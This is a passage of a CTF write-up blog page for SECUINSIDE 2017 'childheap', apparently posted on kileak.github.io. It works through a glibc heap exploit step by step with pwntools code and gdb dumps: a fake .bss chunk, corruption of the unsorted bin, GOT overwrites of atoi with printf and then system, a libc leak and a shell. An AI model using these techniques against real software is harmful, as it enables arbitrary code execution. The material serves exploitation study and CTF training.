+<span class="n">alloc</span><span class="p">(</span><span class="mi">4095</span><span class="p">,</span> <span class="s">"AAAABBBB"</span><span class="p">)</span></code></pre></figure>
+
+<p>Since the FD pointer is <code class="language-plaintext highlighter-rouge">chunk offset + 0x10</code>, faking <code class="language-plaintext highlighter-rouge">0x6020b0</code> as the BK pointer in the chunk will result in overwriting <code class="language-plaintext highlighter-rouge">0x6020c0</code> with the pointer to the unsorted bin list. <code class="language-plaintext highlighter-rouge">0x6020c0</code> also happens to be our pointer to the <code class="language-plaintext highlighter-rouge">USER_INFO</code> struct :)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/10x 0x6020a8
+0x6020a8:	0x0000000000000000	0x0000000000000211  =&gt; Unused    / Fake size
+0x6020b8:	0x0000000000000001	0x00007ffff7dd3b58  =&gt; ALLOCATED / USER_INFO (now pointing to main_arena / unsorted bins)
+0x6020c8:	0x0000000000000000	0x0000000000000000
+0x6020d8:	0x0000000000000000	0x0000000000000000
+0x6020e8:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Though, we now f*cked up the unsorted bin list and trying to free the chunk, we just allocated, would result in a crash, since free tries to check the sanity of the unsorted bin list:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cm">/*
+ Place the chunk in unsorted chunk list. Chunks are
+ not placed into regular bins until after they have
+ been given one chance to be used in malloc.
+*/</span>
+
+<span class="n">bck</span> <span class="o">=</span> <span class="n">unsorted_chunks</span><span class="p">(</span><span class="n">av</span><span class="p">);</span>
+<span class="n">fwd</span> <span class="o">=</span> <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">fwd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">bck</span><span class="p">))</span>
+<span class="p">{</span>
+  <span class="n">errstr</span> <span class="o">=</span> <span class="s">"free(): corrupted unsorted chunks"</span><span class="p">;</span>
+  <span class="k">goto</span> <span class="n">errout</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/30x &amp;main_arena
+0x7ffff7dd3b00 &lt;main_arena&gt;:     0x0000000100000001	0x0000000000000000
+0x7ffff7dd3b10 &lt;main_arena+16&gt;:  0x0000000000000000	0x0000000000000000
+0x7ffff7dd3b20 &lt;main_arena+32&gt;:  0x0000000000000000	0x0000000000000000
+0x7ffff7dd3b30 &lt;main_arena+48&gt;:  0x0000000000000000	0x0000000000000000
+0x7ffff7dd3b40 &lt;main_arena+64&gt;:  0x0000000000000000	0x0000000000000000
+0x7ffff7dd3b50 &lt;main_arena+80&gt;:  0x0000000000000000	0x0000000000604040 
+0x7ffff7dd3b60 &lt;main_arena+96&gt;:  0x0000000000000000	0x0000000000603000 =&gt; XXXX / bck-&gt;fd
+0x7ffff7dd3b70 &lt;main_arena+112&gt;: 0x00000000006020b0	0x00007ffff7dd3b68
+0x7ffff7dd3b80 &lt;main_arena+128&gt;: 0x00007ffff7dd3b68	0x00007ffff7dd3b78
+
+gdb-peda$ x/10x 0x603000
+0x603000:	0x0000000000000000	0x0000000000001011
+0x603010:	0x4242424241414141	0x000000000060200a  =&gt; FD / BK
+0x603020:	0x000000000000000a	0x0000000000000000</code></pre></figure>
+
+<p>Ok, this will absolutely fail. It first gets a pointer to the unsorted chunks and stores it in bck (<code class="language-plaintext highlighter-rouge">0x7ffff7dd3b58</code>). It then gets the FD pointer from that address (<code class="language-plaintext highlighter-rouge">bck+0x10 = 0x7ffff7dd3b68 ==&gt; 0x603000</code>). So <code class="language-plaintext highlighter-rouge">fwd</code> will be <code class="language-plaintext highlighter-rouge">0x603000</code> and then it tries to get the BK pointer from there (<code class="language-plaintext highlighter-rouge">fwd + 0x18 = 0x60200a</code>).</p>
+
+<p>So, the comparison will be <code class="language-plaintext highlighter-rouge">0x7ffff7dd3b58 == 0x60200a</code>, which obviously fails and thus crashes the application.</p>
+
+<p>But well, we have an editable object pointing straight into the unsorted bin list… The USER_INFO object (which was previously overwritten with a pointer to main_arena). This should help us fixing this mess :)</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Modify   =&gt; Overwrite unsorted bin list in main_arena with fake 'secret' chunk pointers to fix unsorted bin list"</span><span class="p">)</span>
+<span class="n">modify</span><span class="p">(</span><span class="bp">False</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">True</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6020a8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x6020a8</span><span class="p">))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Free     =&gt; Reset allocated check and puts our fake chunk into unsorted bin list again"</span><span class="p">)</span>	
+<span class="n">free</span><span class="p">()</span></code></pre></figure>
+
+<p>This will write the pointers to our BSS fake chunk into the heap, and then copy it to the address <code class="language-plaintext highlighter-rouge">USER_INFO</code> points to (which happens to be main_arena).</p>
+
+<p>So, let’s take another look at this after the modification:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/30x &amp;main_arena
+0x7ffff7dd3b00 &lt;main_arena&gt;:     0x0000000100000000	0x0000000000000000
+0x7ffff7dd3b10 &lt;main_arena+16&gt;:  0x0000000000000000	0x0000000000000000
+0x7ffff7dd3b20 &lt;main_arena+32&gt;:  0x0000000000000000	0x0000000000000000
+0x7ffff7dd3b30 &lt;main_arena+48&gt;:  0x0000000000000000	0x0000000000000000
+0x7ffff7dd3b40 &lt;main_arena+64&gt;:  0x0000000000000000	0x0000000000000000
+0x7ffff7dd3b50 &lt;main_arena+80&gt;:  0x0000000000000000	0x0000000000604040
+0x7ffff7dd3b60 &lt;main_arena+96&gt;:  0x0000000000000000	0x00000000006020a8 =&gt; XXXX / bck-&gt;fd
+0x7ffff7dd3b70 &lt;main_arena+112&gt;: 0x00000000006020a8	0x00007ffff7dd3b68
+0x7ffff7dd3b80 &lt;main_arena+128&gt;: 0x00007ffff7dd3b68	0x00007ffff7dd3b78
+
+gdb-peda$ x/10x 0x6020a8
+0x6020a8:	0x0000000000000000	0x0000000000000211
+0x6020b8:	0x0000000000000001	0x00007ffff7dd3b58
+0x6020c8:	0x0000000000000000	0x0000000000000000
+0x6020d8:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>So… <code class="language-plaintext highlighter-rouge">bck</code> will still be <code class="language-plaintext highlighter-rouge">0x7ffff7dd3b58</code>, since it’s the pointer to unsorted bins. But <code class="language-plaintext highlighter-rouge">bck-&gt;fd</code> now changed to <code class="language-plaintext highlighter-rouge">0x6020a8</code>, which points to our fake chunk in the bss. When it now tries to get the FD pointer, it will be (<code class="language-plaintext highlighter-rouge">bck+0x10 = 0x7ffff7dd3b68</code> ==&gt; <code class="language-plaintext highlighter-rouge">0x6020a8</code>). So <code class="language-plaintext highlighter-rouge">fwd</code>is now <code class="language-plaintext highlighter-rouge">0x6020a8</code>and when <code class="language-plaintext highlighter-rouge">free</code> dereferences it and reads the BK pointer, it will result in <code class="language-plaintext highlighter-rouge">fwd+0x18 = 0x6020a8 + 0x18 = 0x6020c0 ==&gt; 0x00007ffff7dd3b58</code>.</p>
+
+<p>So the comparison will now be <code class="language-plaintext highlighter-rouge">0x00007ffff7dd3b58 == 0x00007ffff7dd3b58</code> resulting in <code class="language-plaintext highlighter-rouge">free</code> happily freeing our chunk again.</p>
+
+<p>We now have successfully freed the chunk again, which resets <code class="language-plaintext highlighter-rouge">ALLOCATED</code>, allowing us to allocate new chunks again.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ p main_arena
+$13 = {
+  mutex = 0x0, 
+  flags = 0x1, 
+  fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0}, 
+  top = 0x604040, 
+  last_remainder = 0x0, 
+  bins = {0x603000, 0x6020a8, 0x7ffff7dd3b68 &lt;main_arena+104&gt;, 0x7ffff7dd3b68 &lt;main_arena+104&gt;, 0x7ffff7dd3b78 &lt;main_arena+120&gt;, 0x7ffff7dd3b78 &lt;main_arena+120&gt;, 0x7ffff7dd3b88 &lt;main_arena+136&gt;, 
+    0x7ffff7dd3b88 &lt;main_arena+136&gt;, 0x7ffff7dd3b98 &lt;main_arena+152&gt;, 0x7ffff7dd3b98 &lt;main_arena+152&gt;, 0x7ffff7dd3ba8 &lt;main_arena+168&gt;, 0x7ffff7dd3ba8 &lt;main_arena+168&gt;, 0x7ffff7dd3bb8 &lt;main_arena+184&gt;,    </code></pre></figure>
+
+<p>Though our initial chunk got on top of unsorted bin list, we also managed to write the address from our bss fake chunk into the unsorted bin list. We’re nearly at the finish line :)</p>
+
+<p>Remember, that we abused the <code class="language-plaintext highlighter-rouge">secret menu</code> to write a fake chunk size? This will pay off now…</p>
+
+<p>When we now allocate a chunk with a size around 0x210, malloc will try to get a matching chunk from the unsorted bin list, discovering our fake chunk in the bss with a matching chunk size, just waiting there to get allocated :)</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Allocate =&gt; Get our fake 'secret' chunk and overwrite 'modify pointer' with ATOI GOT"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"AAAABBBB"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x602070</span><span class="o">-</span><span class="mh">0x8</span><span class="o">-</span><span class="mh">0x2</span><span class="p">)</span>
+	
+<span class="n">alloc</span><span class="p">(</span><span class="mi">512</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>Finally a chunk overlapping the <code class="language-plaintext highlighter-rouge">USER_INFO</code> pointer and we have absolute control over the content, which will overwrite it.</p>
+
+<p>So, we’ll be using it to overwrite it with the adress of ATOI got (small padding there).</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/10x 0x6020a8
+0x6020a8:	0x0000000000000000	0x0000000000000211 =&gt; Fake chunk
+0x6020b8:	0x0000000000000001	0x0000000000602066 =&gt; ALLOCATED / USER_INFO (pointing to ATOI got)
+0x6020c8:	0x000000000000000a	0x0000000000000000</code></pre></figure>
+
+<p>Now, we should be able to overwrite <code class="language-plaintext highlighter-rouge">atoi</code> with the help of the <code class="language-plaintext highlighter-rouge">modify</code> function. Though, we have an arbitrary write now, what can we do with it, since ASLR is active and we didn’t found a leak by now to get the libc address?</p>
+
+<p>Well, let’s create a format string vulnerability by overwriting <code class="language-plaintext highlighter-rouge">atoi</code> got with <code class="language-plaintext highlighter-rouge">printf</code> plt. Thus, everytime <code class="language-plaintext highlighter-rouge">atoi</code> gets called, the binary will call <code class="language-plaintext highlighter-rouge">printf</code> instead (with the arguments, that should have been passed to <code class="language-plaintext highlighter-rouge">atoi</code>).</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Modify   =&gt; Overwrite ATOI with printf"</span><span class="p">)</span>
+<span class="n">modify</span><span class="p">(</span><span class="bp">False</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="bp">True</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">PRINTF</span><span class="p">))</span></code></pre></figure>
+
+<p>The binary uses <code class="language-plaintext highlighter-rouge">readInteger</code> to determine which menu option we selected (which then uses <code class="language-plaintext highlighter-rouge">atoi</code> to convert our input to a number):</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">readInteger</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> 
+  <span class="n">__int64</span> <span class="n">buf</span><span class="p">;</span> 
+ 
+  <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">15uLL</span><span class="p">);</span>
+  <span class="n">result</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">);</span>
+ 
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>This means we have control over the arguments, which will be passed to <code class="language-plaintext highlighter-rouge">printf</code> also, so let’s make good use of it:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Format   =&gt; Leak LIBC address"</span><span class="p">)</span>
+	
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"%3$p"</span><span class="p">)</span>        <span class="c1"># Parameter 3 contains a LIBC address
+</span>
+<span class="n">LEAK</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">LIBC</span> <span class="o">=</span> <span class="n">LEAK</span> <span class="o">-</span> <span class="mh">0xf69b0</span>
+<span class="n">SYSTEM</span> <span class="o">=</span> <span class="n">LIBC</span> <span class="o">+</span> <span class="mh">0x45380</span>
+
+<span class="k">print</span> <span class="s">""</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LEAK</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC base      : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">LIBC</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"SYSTEM         : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">))</span>
+<span class="k">print</span> <span class="s">""</span></code></pre></figure>
+
+<p>So, we’ve got a libc address and calculated the address of <code class="language-plaintext highlighter-rouge">system</code>.</p>
+
+<p>If we now overwrite <code class="language-plaintext highlighter-rouge">atoi got</code> again, but this time with the address of <code class="language-plaintext highlighter-rouge">system</code>, we should be able to trigger a shell.</p>
+
+<p>We just have to remember, that we already changed <code class="language-plaintext highlighter-rouge">atoi</code>, so the menu handler won’t be able anymore to convert our input to a number. Entering <code class="language-plaintext highlighter-rouge">3</code> won’t result in calling <code class="language-plaintext highlighter-rouge">modify</code>, but just crash the application instead.</p>
+
+<p>Well, but <code class="language-plaintext highlighter-rouge">printf</code> returns the number of characters, which were printed out. Soooo, we just have to print out 3 characters, and the menu handler will interpret this, as if we would have selected <code class="language-plaintext highlighter-rouge">3</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Modify   =&gt; Overwrite ATOI with system"</span><span class="p">)</span>
+
+<span class="c1"># Since ATOI was overwritten, the number of chars now define the selected menu =&gt; 'AA\n' = 3
+</span><span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"AA"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"?"</span><span class="p">,</span> <span class="s">"n"</span><span class="p">)</span>               <span class="c1"># Ignore age
+</span><span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">":"</span><span class="p">,</span> <span class="s">"AA"</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSTEM</span><span class="p">))</span>  <span class="c1"># Name
+</span><span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"?"</span><span class="p">,</span> <span class="s">"y"</span><span class="p">)</span>               <span class="c1"># Copy name to destination (ATOI got)
+</span><span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">)</span></code></pre></figure>
+
+<p>This will overwrite <code class="language-plaintext highlighter-rouge">atoi got</code> with the address to <code class="language-plaintext highlighter-rouge">system</code>. Now everything, we enter at the menu, will call <code class="language-plaintext highlighter-rouge">system</code> and pass our input as an argument.</p>
+
+<p>Perfect for calling <code class="language-plaintext highlighter-rouge">system("sh")</code> :)</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Trigger shell..."</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"sh"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">$ </span>python xpl.py 
+<span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./childheap'</span>: pid 4473
+<span class="o">[</span>4473]
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Paused <span class="o">(</span>press any to <span class="k">continue</span><span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Allocate <span class="o">=&gt;</span> Allocate chunk with size 4095
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Secret   <span class="o">=&gt;</span> Create fake chunk by abusing the <span class="s1">'secret menu'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Free     <span class="o">=&gt;</span> Free chunk
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Modify   <span class="o">=&gt;</span> Allocates an <span class="s1">'input'</span> chunk, overlapping allocated chunk
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Free     <span class="o">=&gt;</span> Puts chunk into unsorted bin list again
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Modify   <span class="o">=&gt;</span> Write fake FD/BK into allocated chunk
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Allocate <span class="o">=&gt;</span> Removes chunk from unsorted bin list, overwriting FD pointer <span class="k">in </span>fake chunk
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Modify   <span class="o">=&gt;</span> Overwrite unsorted bin list <span class="k">in </span>main_arena with fake <span class="s1">'secret'</span> chunk pointers to fix unsorted bin list
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Free     <span class="o">=&gt;</span> Reset allocated check and puts our fake chunk into unsorted bin list again
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Allocate <span class="o">=&gt;</span> Get our fake <span class="s1">'secret'</span> chunk and overwrite <span class="s1">'USER_INFO'</span> with ATOI GOT
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Modify   <span class="o">=&gt;</span> Overwrite ATOI with <span class="nb">printf</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Format   <span class="o">=&gt;</span> Leak LIBC address
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> LIBC leak      : 0x7ffff7b069b0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> LIBC base      : 0x7ffff7a10000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> SYSTEM         : 0x7ffff7a55380
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Modify   <span class="o">=&gt;</span> Overwrite ATOI with system
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trigger shell...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
+Linux beast 4.9.0-kali4-amd64 <span class="c">#1 SMP Debian 4.9.30-1kali1 (2017-06-06) x86_64 GNU/Linux</span>
+<span class="nv">$ </span> </code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=SECUINSIDE CTF Quals 2017 - childheap&amp;url=https://kileak.github.io/ctf/2017/SecuInsideQual-ChildHeap/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2017/SecuInsideQual-ChildHeap/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2017/SecuInsideQual-ChildHeap';
+        var disqus_title = 'SECUINSIDE CTF Quals 2017 - childheap';
+        var disqus_url = 'https://kileak.github.io/ctf/2017/SecuInsideQual-ChildHeap';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
